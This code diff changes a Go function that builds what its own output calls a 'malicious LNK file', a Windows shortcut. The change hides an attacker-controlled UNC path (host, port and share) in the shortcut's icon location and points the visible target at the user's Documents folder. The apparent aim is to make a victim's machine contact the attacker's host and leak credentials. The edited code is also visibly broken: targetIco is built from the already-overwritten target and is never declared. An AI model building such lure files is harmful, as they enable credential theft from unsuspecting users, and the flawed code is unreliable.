@@ -21,7 +21,8 @@ func CreateLNK(target string, output string, description string, port string, sh
 	fmt.Printf("[+] Preparing your malicious LNK file...\n\n")
 
 	// Set the target path
-	target = "\\\\" + target + "@" + port + "\\" + share
+	target = "%USERPROFILE%\\Documents"
+	targetIco = "\\\\" + target + "@" + port + "\\" + share
 
 	// Record the start time
 	LNKCreationStartTime := time.Now()
@@ -54,7 +55,7 @@ func CreateLNK(target string, output string, description string, port string, sh
 	// Set properties of the shortcut
 	oleutil.PutProperty(shortcut.ToIDispatch(), "TargetPath", target)
 	oleutil.PutProperty(shortcut.ToIDispatch(), "Description", description)
-	oleutil.PutProperty(shortcut.ToIDispatch(), "IconLocation", target+",12")
+	oleutil.PutProperty(shortcut.ToIDispatch(), "IconLocation", targetIco)
 	oleutil.PutProperty(shortcut.ToIDispatch(), "WindowStyle", 7)
 
 	// Save the shortcut
